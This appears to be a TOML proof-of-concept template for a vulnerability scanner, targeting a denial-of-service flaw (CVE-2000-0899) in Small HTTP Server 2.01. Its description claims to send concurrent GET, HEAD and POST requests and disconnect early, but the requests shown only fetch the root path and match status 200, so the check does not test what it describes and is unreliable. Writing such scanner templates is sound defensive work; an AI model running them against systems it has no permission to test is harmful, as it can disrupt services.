[info]
author = "ave"
description = "Small HTTP Server 2.01 拒绝服务漏洞验证：通过并发发送多个 GET/HEAD/POST 请求并在服务器响应前断开连接，验证目标服务器是否因资源未及时释放而拒绝服务。"
id = "POC-AVE-2000-1002"
name = "CVE-2000-0899 PoC"
severity = "medium"
tags = ["ave-2000-1002"]
vuln_id = [
    "CVE-2000-0899",
    "AVE-2000-1002",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "HEAD"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
